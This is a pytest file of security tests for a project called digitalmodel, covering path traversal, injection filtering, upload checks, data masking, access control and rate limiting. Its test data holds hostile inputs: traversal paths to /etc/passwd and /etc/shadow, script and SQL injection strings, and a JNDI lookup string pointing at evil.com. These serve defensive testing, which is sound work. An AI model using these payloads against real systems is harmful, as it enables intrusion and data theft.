"""
Security-focused tests for digitalmodel.

These tests verify security measures and identify potential vulnerabilities.
"""

import pytest
from unittest.mock import Mock, patch
import os
import tempfile
import json
from pathlib import Path
import hashlib


@pytest.fixture
def temp_directory(tmp_path):
    """Provide a temporary directory for tests."""
    return tmp_path


@pytest.mark.security
class TestInputValidation:
    """Security tests for input validation."""

    def test_path_traversal_prevention(self, temp_directory):
        """Test prevention of path traversal attacks."""

        def safe_file_access(base_dir, filename):
            """Safely access files within base directory."""
            import urllib.parse

            # Decode URL-encoded paths (e.g., %2e%2e%2f -> ../)
            filename = urllib.parse.unquote(filename)

            # Normalize Windows-style backslashes to forward slashes for cross-platform security
            filename = filename.replace('\\', '/')

            # Normalize and resolve paths
            base_path = Path(base_dir).resolve()
            file_path = (base_path / filename).resolve()

            # Ensure the file is within the base directory
            try:
                file_path.relative_to(base_path)
                return str(file_path)
            except ValueError:
                raise SecurityError("Path traversal attempt detected")

        class SecurityError(Exception):
            pass

        base_dir = temp_directory

        # Test legitimate file access
        legitimate_file = safe_file_access(base_dir, "test.txt")
        assert str(base_dir) in legitimate_file

        # Test path traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "..\\..\\..",
            "../../../../etc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]

        for attempt in traversal_attempts:
            with pytest.raises(SecurityError, match="Path traversal"):
                safe_file_access(base_dir, attempt)

    def test_injection_prevention(self):
        """Test prevention of various injection attacks."""

        def sanitize_input(user_input):
            """Sanitize user input to prevent injections."""
            if not isinstance(user_input, str):
                raise ValueError("Input must be string")

            # Check for common injection patterns
            dangerous_patterns = [
                "<script",
                "javascript:",
                "onload=",
                "onerror=",
                "';",
                '";',
                "DROP TABLE",
                "UNION SELECT",
                "exec(",
                "eval(",
                "${",
                "#{",
            ]

            user_input_lower = user_input.lower()
            for pattern in dangerous_patterns:
                if pattern.lower() in user_input_lower:
                    raise ValueError(f"Potentially dangerous input detected: {pattern}")

            return user_input

        # Test legitimate inputs
        safe_inputs = [
            "normal text",
            "user@example.com",
            "123-456-7890",
            "Product Name v1.0",
        ]

        for safe_input in safe_inputs:
            result = sanitize_input(safe_input)
            assert result == safe_input

        # Test dangerous inputs
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "'; DROP TABLE users; --",
            '"; DELETE FROM accounts; --',
            "eval('malicious code')",
            "${jndi:ldap://evil.com/a}",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(ValueError, match="dangerous input"):
                sanitize_input(dangerous_input)

    def test_file_upload_validation(self, temp_directory):
        """Test file upload security validation."""

        def validate_file_upload(file_path, allowed_extensions=None, max_size=1024*1024):
            """Validate uploaded files for security."""
            if allowed_extensions is None:
                allowed_extensions = {'.txt', '.json', '.csv', '.yaml'}

            file_path = Path(file_path)

            # Check file extension
            if file_path.suffix.lower() not in allowed_extensions:
                raise ValueError(f"File type {file_path.suffix} not allowed")

            # Check file size
            if file_path.exists() and file_path.stat().st_size > max_size:
                raise ValueError(f"File too large")

            # Check for executable content (simple check)
            if file_path.exists():
                content = file_path.read_bytes()
                # Check for executable signatures
                executable_signatures = [
                    b'\x7fELF',  # Linux ELF
                    b'MZ',       # Windows PE
                    b'\xca\xfe\xba\xbe',  # Java class
                ]

                for sig in executable_signatures:
                    if content.startswith(sig):
                        raise ValueError("Executable files not allowed")

            return True

        # Create test files
        safe_file = temp_directory / "safe.txt"
        safe_file.write_text("This is safe content")

        large_file = temp_directory / "large.txt"
        large_file.write_bytes(b"x" * (2 * 1024 * 1024))  # 2MB file

        # Executable content disguised with allowed extension
        executable_file = temp_directory / "malicious.txt"
        executable_file.write_bytes(b"MZ\x90\x00")  # PE header in a .txt file

        # Test valid file
        assert validate_file_upload(safe_file) is True

        # Test invalid extension
        bad_ext_file = temp_directory / "script.exe"
        bad_ext_file.write_text("content")
        with pytest.raises(ValueError, match="File type .exe not allowed"):
            validate_file_upload(bad_ext_file)

        # Test large file
        with pytest.raises(ValueError, match="File too large"):
            validate_file_upload(large_file)

        # Test executable content detection (bypassing extension check)
        with pytest.raises(ValueError, match="Executable files not allowed"):
            validate_file_upload(executable_file)


@pytest.mark.security
class TestDataProtection:
    """Security tests for data protection."""

    def test_sensitive_data_masking(self):
        """Test masking of sensitive data in logs and outputs."""

        def mask_sensitive_data(data, key=None):
            """Mask sensitive information in data."""
            import re

            if isinstance(data, dict):
                return {k: mask_sensitive_data(v, key=k) for k, v in data.items()}
            elif isinstance(data, list):
                return [mask_sensitive_data(item) for item in data]
            elif isinstance(data, str):
                # Mask credit card numbers
                data = re.sub(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
                             'XXXX-XXXX-XXXX-XXXX', data)
                # Mask SSN
                data = re.sub(r'\b\d{3}-\d{2}-\d{4}\b', 'XXX-XX-XXXX', data)
                # Mask email
                data = re.sub(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                             'email@masked.com', data)
                # Mask passwords in config strings like: password="value" or password: value
                if 'password' in data.lower():
                    data = re.sub(r'(password["\']?\s*[:=]\s*["\']?)([^"\'\s]+)',
                                 r'\1********', data, flags=re.IGNORECASE)
                # Mask values where the dict key indicates it's a password field
                if key and 'password' in str(key).lower():
                    data = '********'
                return data
            else:
                return data

        # Test data with sensitive information
        sensitive_data = {
            "user": "john.doe@example.com",
            "credit_card": "4532-1234-5678-9012",
            "ssn": "123-45-6789",
            "password": "secret123",
            "config": 'password="mypassword"',
            "normal_data": "This is fine"
        }

        masked_data = mask_sensitive_data(sensitive_data)

        assert masked_data["user"] == "email@masked.com"
        assert masked_data["credit_card"] == "XXXX-XXXX-XXXX-XXXX"
        assert masked_data["ssn"] == "XXX-XX-XXXX"
        assert "secret123" not in str(masked_data)
        assert "mypassword" not in str(masked_data)
        assert masked_data["normal_data"] == "This is fine"

    def test_encryption_decryption(self):
        """Test data encryption and decryption."""

        def simple_encrypt(data, key):
            """Simple encryption for testing."""
            import base64

            # Simple XOR encryption (not for production!)
            key_bytes = key.encode()
            data_bytes = data.encode()

            encrypted = bytearray()
            for i, byte in enumerate(data_bytes):
                encrypted.append(byte ^ key_bytes[i % len(key_bytes)])

            return base64.b64encode(encrypted).decode()

        def simple_decrypt(encrypted_data, key):
            """Simple decryption for testing."""
            import base64

            encrypted_bytes = base64.b64decode(encrypted_data.encode())
            key_bytes = key.encode()

            decrypted = bytearray()
            for i, byte in enumerate(encrypted_bytes):
                decrypted.append(byte ^ key_bytes[i % len(key_bytes)])

            return decrypted.decode()

        # Test encryption/decryption
        original_data = "This is sensitive information"
        encryption_key = "test_key_123"

        encrypted = simple_encrypt(original_data, encryption_key)
        decrypted = simple_decrypt(encrypted, encryption_key)

        assert encrypted != original_data
        assert decrypted == original_data

        # Test with wrong key
        wrong_key = "wrong_key"
        wrong_decryption = simple_decrypt(encrypted, wrong_key)
        assert wrong_decryption != original_data

    def test_secure_random_generation(self):
        """Test secure random number generation."""
        import secrets
        import string

        def generate_secure_token(length=32):
            """Generate cryptographically secure random token."""
            return secrets.token_urlsafe(length)

        def generate_secure_password(length=16):
            """Generate secure password with guaranteed character types."""
            # Ensure at least one of each required type
            password_chars = [
                secrets.choice(string.ascii_lowercase),
                secrets.choice(string.ascii_uppercase),
                secrets.choice(string.digits),
                secrets.choice("!@#$%^&*")
            ]
            # Fill the rest randomly
            alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
            password_chars.extend(
                secrets.choice(alphabet) for _ in range(length - 4)
            )
            # Shuffle to avoid predictable positions
            import random
            random.shuffle(password_chars)
            return ''.join(password_chars)

        # Test token generation
        token1 = generate_secure_token()
        token2 = generate_secure_token()

        assert len(token1) > 0
        assert token1 != token2  # Should be different
        assert isinstance(token1, str)

        # Test password generation
        password1 = generate_secure_password()
        password2 = generate_secure_password()

        assert len(password1) == 16
        assert password1 != password2
        assert any(c.isdigit() for c in password1)  # Should contain digits
        assert any(c.isalpha() for c in password1)  # Should contain letters


@pytest.mark.security
class TestAccessControl:
    """Security tests for access control mechanisms."""

    def test_permission_validation(self):
        """Test permission-based access control."""

        class User:
            def __init__(self, username, permissions):
                self.username = username
                self.permissions = set(permissions)

        class AccessControl:
            def __init__(self):
                self.required_permissions = {}

            def require_permission(self, resource, permission):
                """Set required permission for resource."""
                if resource not in self.required_permissions:
                    self.required_permissions[resource] = set()
                self.required_permissions[resource].add(permission)

            def check_access(self, user, resource):
                """Check if user has access to resource."""
                required = self.required_permissions.get(resource, set())
                return required.issubset(user.permissions)

        # Set up test scenario
        ac = AccessControl()
        ac.require_permission("admin_panel", "admin")
        ac.require_permission("user_data", "read_users")
        ac.require_permission("financial_data", "read_finance")

        # Test users
        admin_user = User("admin", ["admin", "read_users", "read_finance"])
        regular_user = User("user", ["read_users"])
        guest_user = User("guest", [])

        # Test access control
        assert ac.check_access(admin_user, "admin_panel") is True
        assert ac.check_access(admin_user, "user_data") is True
        assert ac.check_access(admin_user, "financial_data") is True

        assert ac.check_access(regular_user, "admin_panel") is False
        assert ac.check_access(regular_user, "user_data") is True
        assert ac.check_access(regular_user, "financial_data") is False

        assert ac.check_access(guest_user, "admin_panel") is False
        assert ac.check_access(guest_user, "user_data") is False
        assert ac.check_access(guest_user, "financial_data") is False

    def test_rate_limiting(self):
        """Test rate limiting for security."""
        import time
        from collections import defaultdict

        class RateLimiter:
            def __init__(self, max_requests=5, time_window=60):
                self.max_requests = max_requests
                self.time_window = time_window
                self.requests = defaultdict(list)

            def is_allowed(self, client_id):
                """Check if request is allowed for client."""
                now = time.time()
                client_requests = self.requests[client_id]

                # Remove old requests outside time window
                client_requests[:] = [req_time for req_time in client_requests
                                    if now - req_time < self.time_window]

                # Check if within limit
                if len(client_requests) < self.max_requests:
                    client_requests.append(now)
                    return True

                return False

        # Test rate limiting
        limiter = RateLimiter(max_requests=3, time_window=1)

        # First 3 requests should be allowed
        assert limiter.is_allowed("client1") is True
        assert limiter.is_allowed("client1") is True
        assert limiter.is_allowed("client1") is True

        # 4th request should be denied
        assert limiter.is_allowed("client1") is False

        # Different client should still be allowed
        assert limiter.is_allowed("client2") is True

        # After time window, requests should be allowed again
        time.sleep(1.1)
        assert limiter.is_allowed("client1") is True


@pytest.mark.security
class TestSecureCommunication:
    """Security tests for communication protocols."""

    def test_certificate_validation(self):
        """Test SSL/TLS certificate validation."""

        def validate_certificate(cert_data):
            """Mock certificate validation."""
            import datetime

            # Mock certificate structure
            required_fields = ['subject', 'issuer', 'not_before', 'not_after', 'signature']

            for field in required_fields:
                if field not in cert_data:
                    return False, f"Missing required field: {field}"

            # Check expiration
            now = datetime.datetime.now()
            not_before = datetime.datetime.fromisoformat(cert_data['not_before'])
            not_after = datetime.datetime.fromisoformat(cert_data['not_after'])

            if now < not_before:
                return False, "Certificate not yet valid"

            if now > not_after:
                return False, "Certificate expired"

            # Check signature (mock validation)
            if cert_data['signature'] == 'invalid':
                return False, "Invalid signature"

            return True, "Certificate valid"

        # Test valid certificate
        valid_cert = {
            'subject': 'CN=example.com',
            'issuer': 'CN=Valid CA',
            'not_before': '2023-01-01T00:00:00',
            'not_after': '2030-12-31T23:59:59',
            'signature': 'valid_signature'
        }

        is_valid, message = validate_certificate(valid_cert)
        assert is_valid is True
        assert message == "Certificate valid"

        # Test expired certificate
        expired_cert = valid_cert.copy()
        expired_cert['not_after'] = '2023-12-31T23:59:59'

        is_valid, message = validate_certificate(expired_cert)
        assert is_valid is False
        assert "expired" in message.lower()

        # Test certificate with invalid signature
        invalid_cert = valid_cert.copy()
        invalid_cert['signature'] = 'invalid'

        is_valid, message = validate_certificate(invalid_cert)
        assert is_valid is False
        assert "signature" in message.lower()

    def test_secure_headers(self):
        """Test security headers in HTTP responses."""

        def add_security_headers(response_headers):
            """Add security headers to HTTP response."""
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Content-Security-Policy': "default-src 'self'",
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            }

            response_headers.update(security_headers)
            return response_headers

        # Test security headers
        original_headers = {'Content-Type': 'application/json'}
        secure_headers = add_security_headers(original_headers.copy())

        # Verify all security headers are present
        assert 'X-Content-Type-Options' in secure_headers
        assert 'X-Frame-Options' in secure_headers
        assert 'X-XSS-Protection' in secure_headers
        assert 'Strict-Transport-Security' in secure_headers
        assert 'Content-Security-Policy' in secure_headers
        assert 'Referrer-Policy' in secure_headers

        # Verify values
        assert secure_headers['X-Content-Type-Options'] == 'nosniff'
        assert secure_headers['X-Frame-Options'] == 'DENY'
        assert 'max-age=' in secure_headers['Strict-Transport-Security']